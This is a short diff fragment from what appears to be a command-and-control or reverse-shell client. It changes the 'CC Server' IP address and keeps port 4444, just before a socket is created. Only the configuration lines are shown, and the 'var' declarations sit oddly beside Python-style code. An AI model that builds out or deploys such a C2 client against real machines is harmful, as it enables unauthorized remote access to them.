@@ -4,7 +4,7 @@ import os
 
 
 # My CC Server IP and Port
-var ip = "172.18.59.30"
+var ip = "172.17.219.231"
 var port = 4444
 
 # Create a new socket
